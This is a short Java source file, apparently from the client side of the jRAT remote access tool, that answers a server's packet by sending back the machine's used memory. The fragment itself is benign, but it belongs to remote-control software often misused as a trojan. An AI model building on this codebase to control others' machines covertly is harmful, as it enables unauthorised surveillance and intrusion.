package jrat.module.system.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

public class Packet33UsedMemory implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet24UsedMemory());
	}

}
